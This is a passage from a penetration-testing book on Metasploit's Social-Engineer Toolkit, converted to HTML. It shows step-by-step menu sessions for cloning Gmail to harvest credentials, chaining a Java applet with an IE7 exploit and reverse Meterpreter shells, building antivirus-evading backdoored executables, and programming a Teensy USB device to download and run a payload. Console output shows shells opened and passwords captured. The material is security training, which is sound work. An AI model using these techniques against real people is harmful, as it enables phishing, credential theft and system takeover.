0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Web Jacking Attack Vector is Enabled...Victim needs to click the link.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_427.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When the target visits the cloned site, he will see the link shown in Figure 10-4. Notice that the URL at the lower-left corner shows <span class="s19">https:// gmail.com/</span>.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="440" height="241" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_428.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 10-4: Initial page and link to the cloned page</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">When the target clicks the link, he is presented with the cloned web page shown in Figure 10-5, which looks exactly like the real Gmail Wel- come page.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="444" height="278" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_429.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 10-5: Cloned Gmail Welcome page</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Notice that the URL text at the top of Figure 10-5 shows our malicious web server. As in preceding examples, you can register a similar domain name to avoid this issue. Once the target enters his username and password in the appropriate fields, you can intercept and harvest the credentials.</p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark303">Putting It All Together with a Multipronged Attack</a><a name="bookmark319">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The multi-attack web vector allows you to chain multiple web attack methods together to perform a single attack. The multi-attack vector allows you to turn on and off different vectors and combine the attacks into one web page. When the user clicks the link, he will be targeted by each of the attack vectors you specify. A multipronged attack is particularly useful because, in some cases, the Java applet might fail, while a client-side Internet Explorer exploit would succeed. Or, the Java applet and the Internet Explorer exploits might fail, but the credential harvester succeeds.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the following example, we’ll use the Java applet attack, the Metasploit client-side exploit, and the web jacking attack. When the target browses the affected site, he will be enticed to click the link and will then be bombarded with a credential harvester, Metasploit exploits, and the Java applet attack. Here we’ll select an Internet Explorer 7 exploit and browse the target’s machine using Internet Explorer 6 just to demonstrate how if one method fails, others can be used.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_430.png"/></span></p><ol id="l22"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">The Java Applet Attack Method</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">The Metasploit Browser Exploit Method</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Credential Harvester Attack Method</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Tabnabbing Attack Method</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Man Left in the Middle Attack Method</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Web Jacking Attack Method</p></li></ol><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">7. Multi-Attack Web Method</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">8. Return to the previous menu</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice (press enter for default): <span class="s24">7</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[!] Website Attack Vectors [!]</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;text-align: left;">8 <span class="s25">2. Site Cloner</span></p><p class="s25" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter number (1-4): <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 14pt;text-align: center;"><span class="s30">@  </span>Enter the url to c<span style=" color: #999;">l</span>one: <span class="s24">https://gmail.com</span></p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 10pt;text-align: center;">Select which attacks you want to use:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">O <span class="s25">1. The Java Applet Attack Method (OFF)</span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 11pt;text-align: left;">@ <span class="s25">2. The Metasploit Browser Exploit Method (OFF)</span></p><ol id="l23"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 9pt;text-align: left;">Credential Harvester Attack Method (OFF)</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Tabnabbing Attack Method (OFF)</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Man Left in the Middle Attack Method (OFF)</p></li></ol><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">0 <span class="s25">6. Web Jacking Attack Method (OFF)</span></p><ol id="l24"><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 9pt;text-align: left;">Use them all - A.K.A. &#39;Tactical Nuke&#39;</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">I&#39;m finished and want to proceed with the attack.</p></li><li><p class="s25" style="padding-left: 103pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Return to main menu.</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice one at a time (hit 8 or enter to launch): <span class="s24">1</span></p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">Turning the Java Applet Attack Vector to ON Select which attacks you want to use:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice one at a time (hit 8 or enter to launch): <span class="s24">2</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Turning the Metasploit Client Side Attack Vector to ON</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">Option added. Press {return} to add or prepare your next attack. Select which attacks you want to use:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice one at a time (hit 8 or enter to launch): <span class="s24">6</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 193%;text-align: left;">Turning the Web Jacking Attack Vector to ON Select which attacks you want to use:</p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Enter your choice one at a time (hit 8 or enter to launch):</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_431.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 71%;text-align: left;">Begin configuring the attack by selecting <span class="s25">Multi-Attack Web Method </span><span class="s32">O </span>from the main menu, and then choose <span class="s25">Site Cloner </span><span class="s32">8 </span>and enter the URL to clone, <span class="s24">https://gmail.com </span><span class="s32">@</span>. Next, SET presents a menu of different attacks. Select <span class="s25">The Java Applet Attack Method </span><span class="s32">O</span>, then <span class="s25">The Metasploit Browser Exploit Method </span><span class="s32">@</span>, and finally, select <span class="s25">Web Jacking Attack Method </span><span class="s32">0</span>. You could also select option 7, <span class="s25">Use them all - A.K.A. &#39;Tactical Nuke&#39; </span>to enable all the attack vectors</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">automatically.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In the preceding example, notice that the flags have changed and that the Java applet, Metasploit browser exploit, credential harvester, and web jacking attack methods have all been enabled. To proceed, press <span class="s9">ENTER </span>or choose option 8 (<span class="s25">I&#39;m finished...</span>).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_432.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enter your choice one at a time (hit 8 or enter to launch):</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">What payload do you want to generate:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Name: Description:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 36pt;text-indent: -12pt;line-height: 73%;text-align: left;">O <span class="s25">2. Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send back to attacker.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Enter choice (hit enter for default):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Below is a list of encodings to try and bypass AV.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Select one of the below, &#39;backdoored executable&#39; is typically the best.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">8 <span class="s25">16. Backdoored Executable (BEST)</span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Enter your choice (enter for default):</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] Enter the PORT of the listener (enter for default):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] Backdoor completed successfully. Payload is now hidden within a legit executable.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">******************************************************** Do you want to create a Linux/OSX reverse_tcp payload in the Java Applet attack as well?</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">********************************************************</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">@ <span class="s25">Enter choice yes or no: </span><span class="s24">no</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Enter the browser exploit you would like to use</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">8. Internet Explorer 7 Uninitialized Memory Corruption (MS09-002)</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Enter your choice (1-12) (enter for default): <span class="s24">8</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Cloning the website: https://gmail.com [*] This could take a little bit...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Injecting Java Applet attack into the newly cloned website. [*] Filename obfuscation complete. Payload name is: x5sKAzS</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Malicious java applet website prepped for deployment</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Injecting iframes into cloned website for MSF Attack....</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Malicious iframe injection successful...crafting payload.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">resource (src/program_junk/meta_config)&gt; exploit -j [*] Exploit running as background job.</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf exploit(ms09_002_memory_corruption) &gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 172.16.32.129:443 [*] Using URL: http://0.0.0.0:8080/</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Local IP: http://172.16.32.129:8080/ [*] Server started.</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_433.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 75%;text-align: left;">To complete the attack setup, select the default reverse Meterpreter payload <span class="s32">O </span>along with default encoding and listening port <span class="s32">8</span>. Choose not to configure a Linux and OS X payload <span class="s32">@</span>, and then set the browser exploit to <span class="s25">Internet Explorer 7 Uninitialized Memory Corruption (MS09-002) </span><span class="s32">O</span>; then SET will launch the attack.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Once everything is running, you can browse to the website and see what’s going on there. A message URL tells you that the site has been moved. Please refer to Figure 10-4 to see what the target will see on his machine.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Click the link and the Metasploit exploit begins. Here’s the handler on the backend:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_434.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 111pt;text-indent: -21pt;line-height: 88%;text-align: left;">[*] Sending Internet Explorer 7 CFunctionPointer Uninitialized Memory Corruption to 172.16.32.131:1329...</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_435.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This exploit fails, because we are using Internet Explorer 6. The target’s screen is shown in Figure 10-6.</p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="444" height="278" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_436.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Figure 10-6: Multi-attack security warning</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We have a backup attack, however. The target clicks Run on the mali- cious Java applet, a Meterpreter shell begins, and the target is redirected back to the original Gmail page. The attack is successful.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Notice that when using the Java applet, we automatically migrate to a sep- arate thread (process) that happens to be <span class="s19">notepad.exe</span>. Because of this, if the target closes the browser, our attack will continue because the process won’t terminate our Meterpreter shell. Also, within the configuration file you can set the “Java Repeater” option, which will continue to prompt the target with the Java applet warning even if he clicks Cancel. This makes it more likely that the target will click the Run button.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">The Meterpreter shell is presented to us once a successful exploit is per- formed, as shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_437.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">[*] Sending stage (748544 bytes) to 172.16.32.131</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1333) at</p><p class="s25" style="padding-left: 111pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">Thu Sep 09 12:33:20 -0400 2010</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">[*] Session ID 1 (172.16.32.129:443 -&gt; 172.16.32.131:1333) processing</p><p class="s25" style="padding-left: 111pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">InitialAutoRunScript &#39;migrate -f&#39;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] Current server process: java.exe (824) [*] Spawning a notepad.exe host process... [*] Migrating into process ID 3044</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">[*] New server process: notepad.exe (3044) msf exploit(ms09_002_memory_corruption) &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_438.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now let’s say that this attack fails, and the target clicks Cancel (without the repeater option enabled). He would then be prompted to enter his user- name and password into the username and password fields, allowing you to successfully harvest the credentials on the website and still have a successful</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">attack. While you wouldn’t have a Meterpreter shell, because the target didn’t click Run, you would still be able to intercept the credentials:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_439.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] WE GOT A HIT! Printing the output:</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">POSSIBLE USERNAME FIELD FOUND: Email=thisismyusername POSSIBLE PASSWORD FIELD FOUND: Passwd=thisismypassword</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] WHEN YOU&#39;RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_440.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As you’ve seen in the preceding examples, you can see that SET offers a number of powerful web-based attack vectors in its arsenal. It can be difficult to persuade a target to think that a cloned site is legitimate. Most knowl- edgeable users are generally cautious about unfamiliar sites and try to avoid potential security issues as they browse the Internet. SET tries to leverage this cautiousness and, by letting you mimic a known website, fool even some of the savviest technical folks.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark304">Infectious Media Generator</a><a name="bookmark320">&zwnj;</a></p><p style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The Infectious Media Generator is a relatively simple attack vector. With this vector, SET creates a folder for you that you can either burn to a CD/DVD or store on a USB thumb drive. The <span class="s19">autorun.inf </span>file is used, which, once inserted into a target’s machine, will execute whatever you specify during attack cre- ation. Currently, SET supports executables (such as Meterpreter) as well as file-format bugs (such as Adobe exploits).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark305">Teensy USB HID Attack Vector</a><a name="bookmark321">&zwnj;</a></p><p style="padding-top: 10pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The Teensy USB HID (human interface device) attack vector is a remarkable combination of customized hardware and restriction bypass via keyboard emulation. Traditionally, when you insert a CD/DVD or USB into your computer, if autorun is disabled, <span class="s19">autorun.inf </span><a href="http://www.prjc.com/" class="s31" target="_blank">isn’t called and you can’t execute your code automatically. However, using the Teensy USB HID, you can emu- late a keyboard and mouse. When you insert the device, it will be detected as a keyboard, and using the microprocessor and onboard flash memory storage, you can send a very fast set of keystrokes to the target’s machine and com- pletely compromise it, regardless of autorun. You can order a Teensy USB HID at </a><a href="http://www.prjc.com/" class="s20" target="_blank">http://www.prjc.com/</a><a href="http://www.prjc.com/" class="s31" target="_blank">.</a></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Let’s set up a Teensy USB HID to perform a WScript download of a</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">Metasploit payload. In the following example, a small WScript file will be written that will download an executable and execute it. This will be our Metasploit payload, and it’s all handled through SET.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_441.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Select from the menu:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 36pt;text-indent: -12pt;line-height: 153%;text-align: left;">O <span class="s25">6. Teensy USB HID Attack Vector Enter your choice: </span><span class="s24">6</span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">Welcome to the Teensy HID Attack Vector. Special thanks to: IronGeek and WinFang</p><ol id="l25"><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 10pt;text-align: left;">Powershell HTTP GET MSF Payload</p></li></ol><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8 <span class="s25">2. WSCRIPT HTTP GET MSF Payload</span></p><ol id="l26"><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 9pt;text-align: left;">Powershell based Reverse Shell</p></li><li><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 11pt;text-align: left;">Return to the main menu.</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Enter your choice: <span class="s24">2</span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@ <span class="s25">Do you want to create a payload and listener yes or no: </span><span class="s24">yes</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">What payload do you want to generate:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Name: Description:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2. Windows Reverse_TCP Meterpreter Spawn a meterpreter shell on victim and send</p><p class="s25" style="padding-left: 240pt;text-indent: 0pt;line-height: 10pt;text-align: left;">back to attacker.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">Enter choice (hit enter for default):</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Below is a list of encodings to try and bypass AV.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Select one of the below, &#39;backdoored executable&#39; is typically the best.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l27"><li><p class="s25" style="padding-left: 53pt;text-indent: -17pt;text-align: left;">Backdoored Executable (BEST)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 14pt;text-align: left;">@ <span class="s25">Enter your choice (enter for default):</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[-] Enter the PORT of the listener (enter for default):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] Backdoor completed successfully. Payload is now hidden within a legit executable</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] PDE file created. You can get it under &#39;reports/teensy.pde&#39;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Be sure to select &quot;Tools&quot;, &quot;Board&quot;, and &quot;Teensy 2.0 (USB/KEYBOARD)&quot; in Arduino Press enter to continue.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Launching MSF Listener...</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">resource (src/program_junk/meta_config)&gt; <span class="s24">exploit -j</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Exploit running as background job. msf exploit(handler) &gt;</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 0.0.0.0:443 [*] Starting the payload handler...</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_442.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">To begin setting up this attack, choose <span class="s25">Teensy USB HID Attack Vector </span><span class="s32">O </span>from the main menu, and then choose <span class="s25">WSCRIPT HTTP GET MSF Payload </span><span class="s32">8</span>. Then tell SET to set up a payload and listener <span class="s32">@</span>, selecting the default Meterpreter payload <span class="s32">O </span>and encoding method <span class="s32">@</span>.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that you have a <span class="s19">.pde </span>file, you will need to download and use the Arduino interface, which is a graphical user interface for compiling the <span class="s19">.pde </span>files to be uploaded to your Teensy device.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><a href="http://www.pjrc.com/)" class="s31" target="_blank">For this attack, follow the instructions at PJRC (</a><a href="http://www.pjrc.com/)" class="s20" target="_blank">http://www.pjrc.com/</a>) for uploading your code to the Teensy board. It’s relatively simple. You install the Teensy loader and libraries. Then you’ll see an IDE (Integrated Drive Electronics) interface called <span class="s19">Arduino</span>. (Arduino/Teensy is supported on Linux, Mac OS X, and Windows operating systems.) One of the <span class="s19">most </span>impor- tant aspects of this is that you ensure that you set your board to a Teensy USB keyboard/mouse, as show in Figure 10-7.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="435" height="304" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_443.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Figure 10-7: Setting up the Teensy device</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">After you have this selected, drag your <span class="s19">.pde </span>file into the Arduino inter- face. Insert your USB device into the computer and upload your code. This will program your device with the SET-generated code. Figure 10-8 shows the code being uploaded.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">After the programmed USB device is inserted into the target’s machine and the code is installed, you should see a Meterpreter shell:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_444.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">[*] Sending stage (748544 bytes) to 172.16.32.131</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">[*] Meterpreter session 1 opened (172.16.32.129:443 -&gt; 172.16.32.131:1333) at</p><p class="s25" style="padding-left: 111pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">Thu June 09 12:52:32 -0400 